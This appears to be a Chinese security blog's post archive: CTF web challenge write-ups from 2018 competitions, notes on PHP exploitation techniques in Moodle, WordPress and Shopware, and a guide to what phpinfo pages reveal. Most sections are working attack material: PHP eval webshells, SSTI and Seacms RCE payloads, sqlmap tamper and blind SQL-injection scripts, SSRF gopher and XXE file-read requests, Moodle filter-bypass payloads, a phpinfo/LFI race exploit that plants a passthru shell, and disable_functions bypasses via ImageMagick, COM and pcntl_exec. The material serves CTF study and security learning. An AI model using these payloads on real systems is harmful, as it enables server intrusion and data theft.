    <content type="text"><![CDATA[0x01 code audit题目描述:101.71.29.5:10039 题目分析:有登陆功能但是没有注册功能，所以要么sqli要么爆破密码，最终爆破得到弱口令进入后台。 12adminadmin123 Backup有提示源码文件和flag文件在服务器上的位置 审计源码，发现其实是CVE-2018-14421的简化版本，使用如下payload来构成rce 12zeroyu&#123;if:1)$GLOBALS[&apos;_G&apos;.&apos;ET&apos;][zeroyu]($GLOBALS[&apos;_G&apos;.&apos;ET&apos;][cool]);die();//&#125;&#123;end if&#125; 注意一点这个id的值是要看响应包的。1http://101.71.29.5:10039//web/index.php?r=content%2Fshow&amp;id=8&amp;zeroyu=system&amp;cool=cat%20/tmp/flag 最后读取flag1flag&#123;65bb1dd503d2a682b47fde40571598f4&#125; 参考1.这篇文章是从payload出发来分析触发点的，很具有借鉴意义–&gt;CVE-2018-14421——Seacms后台getshell分析 文章中提到一点 htm文件在开发中就只是模板文件，需要有控制器来渲染，渲染一般都是有include，render，render_template等等代码关键词，所以我们可以通过这个来确定控制器。 2.seacms v6.61 审计深入思考 0x02 upload题目描述:http://101.71.29.5:10031/index.php 题目分析:1.上传php文件–&gt;上传失败并提示It is not a image 2.burp抓包并修改Content-Type: image/jpeg和文件后缀名–&gt;依旧上传失败 3.猜测可能是判断了文件的格式，比如文件头什么的，所以我在图片里藏了一段PHP代码进行上传–&gt;成功上传，但是无法解析 4.目标是Apache机器，进而构造mu.jpg.php后缀名进行上传–&gt;上传成功并且成功解析 1&lt;?php @eval($_POST[&apos;pass&apos;]) ?&gt; 5.使用cknife进行连接并找到flag 0x03 高级渗透测试题目描述:http://101.71.29.5:10050/ 题目分析:]]></content>
  </entry>
  <entry>
    <title><![CDATA[2018-湖湘杯-Web]]></title>
    <url>%2F2018%2F11%2F19%2F2018-hxb-Web-writeup%2F</url>
    <content type="text"><![CDATA[WEB XmeO题目解析: 是一个ssti类型漏洞 playload 1&#123;&#123; [].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].__dict__['os'].popen('ls').read()&#125;&#125; 参考: 之前一直也是被搅屎，后来下线了没管，结果最后5分钟他又上线了。。。5分钟里还挂了3分钟，没翻到flag，打扰了。 https://www.jianshu.com/p/6e4aebd18660 http://www.cnblogs.com/tyomcat/p/5440488.html https://www.freebuf.com/articles/web/133336.html WEB Code Check题目解析: 目录遍历得到源码(我说我之前是百度+猜解得到加解密算法的你敢信)1http://39.108.176.234:49882/news/ 12345678910111213141516171819202122232425262728293031323334&lt;?phpheader('content-type:text/html;charset=utf-8');require_once '../config.php';//解密过程function decode($data)&#123; $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,'',MCRYPT_MODE_CBC,''); mcrypt_generic_init($td,'ydhaqPQnexoaDuW3','2018201920202021'); $data = mdecrypt_generic($td,base64_decode(base64_decode($data))); mcrypt_generic_deinit($td); mcrypt_module_close($td); if(substr(trim($data),-7)!=='hxb2018')&#123; echo '&lt;script&gt;window.location.href="/index.php";&lt;/script&gt;'; &#125;else&#123; return substr(trim($data),0,strlen(trim($data))-7); &#125;&#125;$id=decode($_GET['id']);$sql="select id,title,content,time from notice where id=$id";$info=$link-&gt;query($sql);$arr=$info-&gt;fetch_assoc();?&gt;&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;X公司HR系统V1.0&lt;/title&gt;&lt;style&gt;.body&#123;width:600px;height:500px;margin:0 auto&#125;.title&#123;color:red;height:60px;line-height:60px;font-size:30px;font-weight:700;margin-top:75pt;border-bottom:2px solid red;text-align:center&#125;.content,.title&#123;margin:0 auto;width:600px;display:block&#125;.content&#123;height:30px;line-height:30px;font-size:18px;margin-top:40px;text-align:left;color:#828282&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="body"&gt;&lt;div class="title"&gt;&lt;?php echo $arr['title']?&gt;&lt;/div&gt;&lt;div class="content"&gt;&lt;?php echo $arr['content']?&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 使用dirsearch扫描还发现了phpinfo页面1http://39.108.176.234:49882/0.php 依据解密过程写出加密过程12345678910111213141516171819202122232425262728293031323334&lt;?php// header('content-type:text/html;charset=utf-8');// require_once '../config.php';//解密过程function decode($data) &#123; $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128, '', MCRYPT_MODE_CBC, ''); mcrypt_generic_init($td, 'ydhaqPQnexoaDuW3', '2018201920202021'); $data = mdecrypt_generic($td, base64_decode(base64_decode($data))); mcrypt_generic_deinit($td); mcrypt_module_close($td); if (substr(trim($data), -7) !== 'hxb2018') &#123; echo '&lt;script&gt;window.location.href="/index.php";&lt;/script&gt;'; &#125; else &#123;// var_dump($data); return substr(trim($data), 0, strlen(trim($data)) - 7); &#125;&#125;function encode($data) &#123; $td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,'',MCRYPT_MODE_CBC,''); mcrypt_generic_init($td,'ydhaqPQnexoaDuW3','2018201920202021'); $data = mcrypt_generic($td,$data); mcrypt_generic_deinit($td); mcrypt_module_close($td); $data = base64_encode(base64_encode($data)); return $data;&#125;$id = decode("b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09");//echo $id;//$deid=encode("2hxb2018");$enid=$_GET['enid']."hxb2018";$deid=encode($enid);//$id = decode($deid);echo $deid; 我将加密算法放在了本地服务器上然后写了一个sqlmap的tamper去进行注入。12345678910111213141516171819202122232425#!/usr/bin/env python"""Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)See the file 'doc/COPYING' for copying permission"""import requestsfrom lib.core.enums import PRIORITYfrom lib.core.settings import UNICODE_ENCODING__priority__ = PRIORITY.LOWESTdef dependencies(): passdef tamper(payload, **kwargs): if payload: enurl="http://localhost/footest/test.php?enid=&#123;&#125;".format(payload) enpayload=requests.get(enurl) return enpayload.content else: payload payload如下1python sqlmap.py -u"http://39.108.176.234:49882/news/list.php?id=b3FCRU5iOU9IemZYc1JQSkY0WG5JZz09" --tamper 23333 -D "mozhe_discuz_stormgroup" -T "notice2" -C "title" --dump 注入得到的数据如下12345678Database: mozhe_discuz_stormgroupTable: notice2[1 entry]+-------------------------------------------+| title |+-------------------------------------------+| hxb2018&#123;14ef3bd9a833a50b7ae24bbb0e4d57c8&#125; |+-------------------------------------------+ 参考: 就是依据这个链接猜到源码的大概 http://cpsliang.com/archives/634 WEB Readflag题目描述: 来骗我的flag呀~ 47.107.145.220:80 解题分析: burp的intrude fuzz常见配置文件路径，得到配置文件1url=file:///etc/apache2/sites-enabled/000-default.conf 从配置文件中读到web路径123456789101112131415161718192021222324252627282930&lt;VirtualHost *:80&gt; # The ServerName directive sets the request scheme, hostname and port that # the server uses to identify itself. This is used when creating # redirection URLs. In the context of virtual hosts, the ServerName # specifies what hostname must appear in the request&apos;s Host: header to # match this virtual host. For the default virtual host (this file) this # value is not decisive as it is used as a last resort host regardless. # However, you must set it for any further virtual host explicitly. #ServerName www.example.com ServerAdmin webmaster@localhost DocumentRoot /var/www/html/ssrf/web.php # Available loglevels: trace8, ..., trace1, debug, info, notice, warn, # error, crit, alert, emerg. # It is also possible to configure the loglevel for particular # modules, e.g. #LogLevel info ssl:warn ErrorLog $&#123;APACHE_LOG_DIR&#125;/error.log CustomLog $&#123;APACHE_LOG_DIR&#125;/access.log combined # For most configuration files from conf-available/, which are # enabled or disabled at a global level, it is possible to # include a line for only one particular virtual host. For example the # following line enables the CGI configuration for this host only # after it has been globally disabled with &quot;a2disconf&quot;. #Include conf-available/serve-cgi-bin.conf&lt;/VirtualHost&gt;# vim: syntax=apache ts=4 sw=4 sts=4 sr noet 依据找到的web路径去读取源码1http://47.107.145.220/?url=file:///var/www/html/ssrf/web.php 依据源码构造gopher去post数据进而得到flag123456789101112131415161718192021222324&lt;?php if(!isset($_GET['url']))&#123; echo "ssrf me with parameter 'url'";&#125;$ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $_GET['url']); //echo $_GET['url'];curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0); echo curl_exec($ch); curl_close($ch); //var_dump($_POST);$ip = $_SERVER['REMOTE_ADDR'];if(isset($_POST['user']))&#123; if($_POST['user']=="admin" &amp;&amp; $ip=="127.0.0.1")&#123; system("/var/www/html/ssrf/readflag");&#125;&#125;?&gt; 最后的payload如下12345678GET /?url=%67%6f%70%68%65%72%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%38%30%2f%5f%50%4f%53%54%20%2f%73%73%72%66%2f%77%65%62%2e%70%68%70%20%48%54%54%50%2f%31%2e%31%25%30%64%25%30%61%48%6f%73%74%3a%20%31%32%37%2e%30%2e%30%2e%31%36%25%30%64%25%30%61%55%73%65%72%2d%41%67%65%6e%74%3a%20%63%75%72%6c%2f%37%2e%31%31%2e%30%25%30%64%25%30%61%41%63%63%65%70%74%3a%20%2a%2f%2a%25%30%64%25%30%61%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%31%30%25%30%64%25%30%61%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%25%30%64%25%30%61%25%30%64%25%30%61%75%73%65%72%3d%61%64%6d%69%6e HTTP/1.1Host: 47.107.238.3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: closeUpgrade-Insecure-Requests: 1 参考: 做题时看到的比较有意思的一篇文章，在没有得到源码前我以为题目的逻辑是这样的，因为之前我探测得到MySQL服务是存在的，但后来发现我猜错了。 Gopher 协议 ssrf MYSQL 研究 WEB MyNote题目分析: 首先找到了robots.txt1robots.txt 看到内容里面包含了几个文件12345User-agent: *Allow: /controllers/Basecontrol.phpAllow: /controllers/Controllers.phpAllow: /controllers/User.phpAllow: /flag.php 之后base64解码查看图片界面的返回信息发现是反序列化信息，进而构造如下数据去读取flag.php文件，最终得到flag12345&lt;?php$b[] = '../../flag.php';echo urlencode(base64_encode(serialize($b))); payload123456789GET /index.php/picture HTTP/1.1Host: 47.107.239.135User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closeCookie: Picture=YToxOntpOjA7czoxNDoiLi4vLi4vZmxhZy5waHAiO30%3D; PHPSESSID=a966des9csihs3pdc7plieldshUpgrade-Insecure-Requests: 1 题目下线太快了，忘记保存flag的响应包了。12 参考: 这题目可以getshell，所以一直被搅屎，而且存在原题。。。 https://legoc.github.io/2018/06/26/%E5%AE%89%E6%81%92%E5%85%AD%E6%9C%88%E6%9C%88%E8%B5%9B/]]></content>
  </entry>
  <entry>
    <title><![CDATA[2018 EIS Web writeup]]></title>
    <url>%2F2018%2F11%2F17%2F2018-EIS-Web-writeup%2F</url>
    <content type="text"><![CDATA[SimpleBBS题目描述:SimpleBBS http://bbs.sec.zju.edu.cn/ 题目解析:1.登录处报错2.导出burp的包使用sqlmap进行测试 1sqlmap -r bbs.txt --dbs 123available databases [2]:[*] bbs[*] information_schema 1sqlmap -r bbs.txt -D &quot;bbs&quot; --tables 1234567891011Database: bbs[7 tables]+----------+| admin || articles || comments || flag || messages || sections || users |+----------+ 1sqlmap -r bbs.txt -D &quot;bbs&quot; --tables 1234567891011Database: bbs[7 tables]+----------+| admin || articles || comments || flag || messages || sections || users |+----------+ 1sqlmap -r bbs.txt -D &quot;bbs&quot; -T &quot;flag&quot; -C &quot;f&quot; --dump 123456789# 测试的时候已经没有flag了....Database: bbsTable: flag[1 entry]+---------+| f |+---------+| &lt;blank&gt; |+---------+ SimpleBlog题目描述:SimpleBlog http://210.32.4.20/ 题目解析:刚开始一直再找文件包含想看下源码，后来是在找不到就认真做了下题目。发现直接二次注入就好了，如果注入内容存在后面做题的分数会为0。 1234567891011121314151617181920212223242526272829import requestsimport stringimport urllibflag=""register = 'http://210.32.4.20/register.php'login = 'http://210.32.4.20/login.php'answer = 'http://210.32.4.20/answer.php'logout = 'http://210.32.4.20/logout.php'for i in range(3,50): for j in range(32,126): print "i:",chr(i),"j",chr(j) req = requests.session() payload = "\' or if((ascii(substr((select flag from flag),"+str(i)+",1))="+str(j)+"),1,0)='1' or \'" post_answer = &#123;'1.a':'on'&#125; login_data = &#123;'username':urllib.quote(payload),'password':'zeroyu'&#125; r = req.post(register,data=login_data) lin = req.post(login,data=login_data) ans = req.post(answer,data=post_answer) if 'Your grades is 0' not in ans.content: f=chr(j) print f flag=flag+f print flag break lout = req.get(logout) SimpleServerInjection题目描述:SimpleServerInjection, SSI, flag in current directory http://210.32.4.22/index.php 题目解析:了解到是ssi，提示了读flag文件，常规payload发现#号后内容被截断，于是采用编码绕过。 payload 1&lt;!--%23include+virtual%3D&quot;flag&quot;+--&gt; 参考:https://junookyo.blogspot.com/2012/03/shtml-bypass-view-symlink-server-side.html https://www.secpulse.com/archives/66934.html http://xdxd.love/2015/12/09/ssi%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/ SimpleExtensionExplorerInjection题目描述:SimpleExtensionExplorerInjection, XXE, /flag http://210.32.4.21:8080/www/index.html 题目解析:1.burp抓包发现采用json格式传输数据 2.修改Content-Type字段为xml，尝试post xml格式数据 根据请求和响应发现存在xxe漏洞 请求1234567891011121314POST /www/ HTTP/1.1Host: 210.32.4.21:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://210.32.4.21:8080/www/index.htmlContent-Type: application/xml; charset=UTF-8Content-Length: 73Connection: close&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;name&gt;zzz&lt;/name&gt;&lt;age&gt;zzz&lt;/age&gt; 响应 1234567HTTP/1.1 500 Content-Type: application/json;charset=UTF-8Date: Fri, 16 Nov 2018 09:17:40 GMTConnection: closeContent-Length: 254&#123;&quot;timestamp&quot;:&quot;2018-11-16T09:17:40.797+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;org.xml.sax.SAXParseException; lineNumber: 3; columnNumber: 2; The markup in the document following the root element must be well-formed.&quot;,&quot;path&quot;:&quot;/www/&quot;&#125; 3.依据提示/flag，直接去读文件 请求1234567891011121314151617POST /www/ HTTP/1.1Host: 210.32.4.21:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://210.32.4.21:8080/www/index.htmlContent-Type: application/xml; charset=UTF-8Content-Length: 151Connection: close&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;name&lt;/name&gt;&lt;age&gt;&amp;xxe;&lt;/age&gt;&lt;/root&gt; 响应: 1234567HTTP/1.1 200 Content-Type: text/plain;charset=UTF-8Content-Length: 64Date: Fri, 16 Nov 2018 09:21:23 GMTConnection: closeReceived name: name, age: EIS&#123;bce52c116d589ae9472e59a162cc90e2&#125; 参考:https://blog.netspi.com/playing-content-type-xxe-json-endpoints/ https://thief.one/2017/06/20/1/ SimplePrintEventLogger题目描述:SimplePrintEventLogger, same server as SimpleExtensionExploreInjection , RCE, flag in / http://210.32.4.21:8080/www/index.html 题目解析:同一个题目的服务器上，flag在根目录，手动翻一下就好 请求1234567891011121314151617POST /www/ HTTP/1.1Host: 210.32.4.21:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://210.32.4.21:8080/www/index.htmlContent-Type: application/xml; charset=UTF-8Content-Length: 147Connection: close&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;name&lt;/name&gt;&lt;age&gt;&amp;xxe;&lt;/age&gt;&lt;/root&gt; 响应1234567891011121314151617181920212223242526272829HTTP/1.1 200 Content-Type: text/plain;charset=UTF-8Content-Length: 169Date: Fri, 16 Nov 2018 16:46:04 GMTConnection: closeReceived name: name, age: .dockerenvbinbootdevdocker-java-homeetcflagflagvvvvvaaaagegsgag2333homeliblib64mediamntoptprocrootrunsbinsrvsystmpusrvar 读取flagvvvvvaaaagegsgag2333 请求 1234567891011121314151617POST /www/ HTTP/1.1Host: 210.32.4.21:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:63.0) Gecko/20100101 Firefox/63.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateReferer: http://210.32.4.21:8080/www/index.htmlContent-Type: application/xml; charset=UTF-8Content-Length: 171Connection: close&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;&lt;!DOCTYPE netspi [&lt;!ENTITY xxe SYSTEM &quot;file:///flagvvvvvaaaagegsgag2333&quot; &gt;]&gt;&lt;root&gt;&lt;name&gt;name&lt;/name&gt;&lt;age&gt;&amp;xxe;&lt;/age&gt;&lt;/root&gt; 响应 1234567HTTP/1.1 200 Content-Type: text/plain;charset=UTF-8Content-Length: 64Date: Fri, 16 Nov 2018 16:47:38 GMTConnection: closeReceived name: name, age: EIS&#123;f501e9c5323c560b0a40192ce9b7ad38&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[2018最新PHP漏洞利用技巧]]></title>
    <url>%2F2018%2F11%2F13%2FNew-PHP-exploit-techniques%2F</url>
    <content type="text"><![CDATA[0x00 综述本文学习了几种新式的php exploit方法，在此做一笔记 文件删除漏洞, unlink() Phar 反序列化, file*() PHP对象实例化, ReflectionClass() 0x01 WordPress Design Flaw Leads to WooCommerce RCEWooCommerce 3.4.6本版本之前存在任意删除漏洞，因为WordPress的设计缺陷将导致整站被接管。 设计缺陷: WooCommerce插件被关闭之后edit_users权限依旧存在 但是插件的disallow_editing_of_admins过滤器不会再被触发 一般只有administrators可以关闭插件，（但是我们这里有任意文件删除，相当于关闭了插件） 参考：https://blog.ripstech.com/2018/wordpress-design-flaw-leads-to-woocommerce-rce/ 0x02 Moodle &lt; 3.5.0Code Injection 首先，教师角色是必须的(可以利用xss得到) 使用了eval函数 12345678910public function substitute_variables_and_eval($str, $dataset) &#123; // substitues &#123;x&#125; and &#123;y&#125; for numbers like 1.2 with str_replace(): $formula = $this-&gt;substitute_variables($str, $dataset); if ($error = qtype_calculated_find_formula_errors($formula)) &#123; return $error; // formula security mechanism &#125; $str=null; eval('$str = '.$formula.';'); // dangerous eval()-call return $str;&#125; 但是有过滤 1234567891011121314151617181920212223function qtype_calculated_find_formula_errors($formula) &#123; // Returns false if everything is alright // otherwise it constructs an error message. // Strip away dataset names. while (preg_match('~\\&#123;[[:alpha:]][^&gt;&#125; &lt;&#123;"\']*\\&#125;~', $formula, $regs))&#123; $formula = str_replace($regs[0], '1', $formula); &#125; // Strip away empty space and lowercase it. $formula = strtolower(str_replace(' ', '', $formula)); $safeoperatorchar = '-+/*%&gt;:^\~&lt;?=&amp;|!'; /* */ $operatorornumber = "[&#123;$safeoperatorchar&#125;.0-9eE]"; // [...] if (preg_match("~[^&#123;$safeoperatorchar&#125;.0-9eE]+~", $formula, $regs)) &#123; return get_string('illegalformulasyntax','qtype_calculated',$regs[0]); &#125; else &#123; // Formula just might be valid. return false; &#125;&#125; bypass过滤 payload 12341.&#123;a.`$_GET[0]`&#125;2. /*&#123;a*/`$_GET[0]`;//&#123;x&#125;&#125;=&gt; 0=(date;cat/etc/passwd)&gt;../hi.txt bypass官方补丁 1.Blacklist 补丁说明:循环检测输入中是否存在//,/*,#12345678function qtype_calculated_find_formula_errors($formula) &#123; foreach (['//', '/*', '#'] as $commentstart) &#123; if (strpos($formula, $commentstart) !== false) &#123; return get_string('illegalformulasyntax', 'qtype_calculated', $commentstart); &#125; &#125; payload 11?&gt;&lt;?=log(1)&#123;a.`$_GET[0]`.(&#123;x&#125;)&#125;?&gt; 2.拒绝使用占位符嵌套 12345678910111213141516public function find_dataset_names($text) &#123; // Returns the possible dataset names found in the text as an array. // The array has the dataset name for both key and value. if (preg_match_all('~\\&#123;([[:alpha:]][^&gt;&#125; &lt;&#123;"\']*)\\&#125;~',$text,$regs)) &#123; $datasetnames = array_unique($regs[1]); return array_combine($datasetnames, $datasetnames); &#125; else &#123; return []; &#125; &#125;// [...]function qtype_calculated_find_formula_errors($formula) &#123; $datasetnames = find_dataset_names($formula); foreach ($datasetnames as $datasetname) &#123; $formula = str_replace('&#123;'.$datasetname.'&#125;', '1', $formula); &#125; payload 1/*&#123;x&#125;&#123;a*/`$_GET[0]`/*(1)//&#125;&#123;a*/`$_GET[0]`/*(&#123;x&#125;)//&#125;*/ 3.黑名单+线性替换 控制xml实现 参考: https://blog.ripstech.com/2018/moodle-remote-code-execution/ 0x03 WordPress File Delete to Code Execution影响范围: =&lt;4.9.6 前提:拥有媒体文件的删除权限(只能利用其它漏洞或者错误配置来取得) 删除目标: .htaccess 有时其中会包含一些安全策略(比如:访问某些文件夹的权限)，删除后会是安全策略无效。 index.php files 一般这个文件是空的，主要是为了防止列目录，被删除了就有可能去列目录了。 wp-config.php 这个删除了，WordPress就要被重装了。 参考:https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/ 0x04 Phar:// Deserialization敏感点:12345678910111213141516171819202122232425262728include('phar://test.phar');file_get_contents('phar://test.phar');file_put_contents('phar://test.phar', '');copy('phar://test.phar', '');include('phar://test.phar');file_get_contents('phar://test.phar');file_put_contents('phar://test.phar', '');copy('phar://test.phar', '');file_exists('phar://test.phar');is_executable('phar://test.phar');is_file('phar://test.phar');is_dir('phar://test.phar');is_link('phar://test.phar');is_writable('phar://test.phar');fileperms('phar://test.phar');fileinode('phar://test.phar');filesize('phar://test.phar');fileowner('phar://test.phar');filegroup('phar://test.phar'); fileatime('phar://test.phar');filemtime('phar://test.phar');filectime('phar://test.phar');filetype('phar://test.phar');getimagesize('phar://test.phar');exif_read_data('phar://test.phar');stat('phar://test.phar'); lstat('phar://test.phar');touch('phar://test.phar‘);md5_file('phar://test.phar'); 可以参考: https://blog.ripstech.com/2018/new-php-exploitation-technique/ http://seaii-blog.com/index.php/2018/08/23/86.html https://www.anquanke.com/post/id/157657 https://www.anquanke.com/post/id/157439 0x05 Shopware &lt; 5.3.4 PHP Object Instantiation to XXE to RCE影响范围:Shopware version &lt;= 5.3.3 and &gt;= 5.1 XSS→POI→XMLi→XXE→PHAR→POI→POP→RCE 参考:https://blog.ripstech.com/2017/shopware-php-object-instantiation-to-blind-xxe/ 突然发现有人翻译过https://www.freebuf.com/vuls/154415.html]]></content>
  </entry>
  <entry>
    <title><![CDATA[phpinfo可以告诉我们什么]]></title>
    <url>%2F2018%2F11%2F13%2Fwhat-phpinfo-can-tell-we%2F</url>
    <content type="text"><![CDATA[0x00 基本信息system info 详细的操作系统信息，为提权做准备 extension_dirphp扩展的路径 真实ipcdn什么的都不存在的，找到真实ip，扫一扫旁站，没准就拿下几个站。 web根目录 临时文件路径向phpinfo()页面post一个shell（自己写一个上传页面），可以在_FILES[“file1”]中看到上传的临时文件，如果有个lfi，便可以直接getshell了。 phpinfo-lfi利用脚本1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768## PHP : Winning the race condition vs Temporary File Upload - PHPInfo() exploit # Alternative way to easy_php @ N1CTF2018, solved by intrd &amp; shrimpgo - p4f team# @license Creative Commons Attribution-ShareAlike 4.0 International License - http://creativecommons.org/licenses/by-sa/4.0/## passwords.txt payload content# &lt;?php $c=fopen('/app/intrd','w');fwrite($c,'&lt;?php passthru($_GET["f"]);?&gt;');?&gt;import sys,Queue,threading,hashlib,os, requests, pickle, os.path, refrom subprocess import Popen, PIPE, STDOUTNumOfThreads=50queue = Queue.Queue()class checkHash(threading.Thread): def __init__(self,queue): threading.Thread.__init__(self) self.queue=queue def run(self): i=0 while True: self.clear=self.queue.get() passtry = self.clear if passtry != "": padding="A" * 5000 cookies = &#123; 'PHPSESSID': 'o99quh47clk8br394298tkv5o0', 'othercookie': padding &#125; headers = &#123; 'User-Agent': padding, 'Pragma': padding, 'Accept': padding, 'Accept-Language': padding, 'DNT': '1' &#125; files = &#123;'arquivo': open('passwords.txt','rb')&#125; reqs='http://47.97.221.96:23333/index.php?action=../../var/www/phpinfo/index.php&amp;a='+padding #reqs='http://172.17.0.2:80/index.php?action=../../var/www/phpinfo/index.php&amp;a='+padding response = requests.post(reqs, headers=headers, cookies=cookies, files=files, verify=False) data = response.content data = re.search(r"(?&lt;=tmp_name] =&amp;gt; ).*", data).group(0) print data reqs = 'http://47.97.221.96:23333/index.php?action=../..'+data #reqs = 'http://172.17.0.2:80/index.php?action=../..'+data print reqs response = requests.get(reqs, verify=False) data = response.content print data i+=1 self.queue.task_done()for i in range(NumOfThreads): t=checkHash(queue) t.setDaemon(True) t.start()for x in range(0, 9999): x=str(x) queue.put(x.strip())queue.join() 参考:http://dann.com.br/php-winning-the-race-condition-vs-temporary-file-upload-alternative-way-to-easy_php-n1ctf2018/ 0x02 重要配置allow_url_include远程文件包含，但是一般不会开启 asp_tags php标签有4种形式，如果这个选项不开启的话(一般默认不开启)，使用asp的标签是不会解析的。 这里有一篇user.ini+asp_tags绕过的文章 针对内容(php tags)检测的一种绕过思路 实际就是通过向其中添加php_value asp_tags On并上传.htaccess和.user.ini来bypass。 原理，asp_tags的属性是这样的 1PHP_INI_PERDIR：指令可以在php.ini、httpd.conf或.htaccess文件中修改 注意： 在PHP 7已经完全移除了这种标签 short_open_tag还是标签的问题，允许&lt;??&gt;这种形式，并且&lt;?=等价于&lt;? echo disable_functions有时候我们上传了一个webshell却不能用，有很大可能是管理员做了配置，禁用了php执行系统命令的函数。 绕过的方式有这么几个： 1.黑名单绕过百密一疏，寻找黑名单中漏掉的函数，上图中禁用的函数算是比较全的了。 比如有时候没有禁用proc_open 比如在编译php时如果加了-–enable-pcntl选项，就可以使用pcntl_exec()来执行命令。 pcntl是linux下的一个扩展，可以支持php的多线程操作。pcntl_exec函数的作用是在当前进程空间执行指定程序，版本要求：PHP &gt; 4.2.0 1&lt;?php pcntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?&gt; 渗透技巧：利用pcntl_exec突破disable_functions 2.利用扩展（如ImageMagick）绕过利用ImageMagick漏洞绕过disable_function 123456789101112131415161718192021222324&lt;?phpecho "Disable Functions: " . ini_get('disable_functions') . "\n";$command = PHP_SAPI == 'cli' ? $argv[1] : $_GET['cmd'];if ($command == '') &#123; $command = 'id';&#125;$exploit = &lt;&lt;&lt;EOFpush graphic-contextviewbox 0 0 640 480fill 'url(https://example.com/image.jpg"|$command")'pop graphic-contextEOF;file_put_contents("KKKK.mvg", $exploit);$thumb = new Imagick();$thumb-&gt;readImage('KKKK.mvg');$thumb-&gt;writeImage('KKKK.png');$thumb-&gt;clear();$thumb-&gt;destroy();unlink("KKKK.mvg");unlink("KKKK.png");?&gt; 3.利用环境变量LD_PRELOAD来绕过php disable_function 4.利用扩展库绕过 Windows靠系统组件 123456789101112131415&lt;?php$command=$_POST[a];$wsh = new COM('WScript.shell'); // 生成一个COM对象$exec = $wsh-&gt;exec('cmd.exe /c '.$command); //调用对象方法来执行命令$stdout = $exec-&gt;StdOut();$stroutput = $stdout-&gt;ReadAll();echo $stroutput?&gt; Linux下可通过编译拓展库进行绕过 Webshell下命令执行限制及绕过方法 enable_dl上面说的利用扩展库绕过disable_functions，需要使用dl()并且开启这个选项 magic_quotes_gpc它是用来实现addslshes()和stripslashes()这两个功能的，对SQL注入进行防御。 open_basedir这个参数将用户可操作的文件限制在某目录下，但是这个限制是可以绕过的。 PHP绕过open_basedir列目录的研究 php5全版本绕过open_basedir读文件脚本 绕过open_basedir读文件脚本 0x03扩展imagick前段时间影响比较大的漏洞，注意看版本。 漏洞影响ImageMagick 6.9.3-10之前的版本，包括ubuntu源中安装的ImageMagick。 ImageMagick 漏洞利用方式及分析 ImageMagick远程执行漏洞分析及利用 libxmllibxml 2.9以前的版本默认支持并开启了外部实体的引用，服务端解析用户提交的 xml 文件时未对 xml 文件引用的外部实体（含外部普通实体和外部参数实体）做合适的处理，会导致XXE。 memcacheMemcache未授权访问漏洞利用及修复 redis利用redis写webshell session1.序列化的一些问题序列化处理器不一致导致对象注入 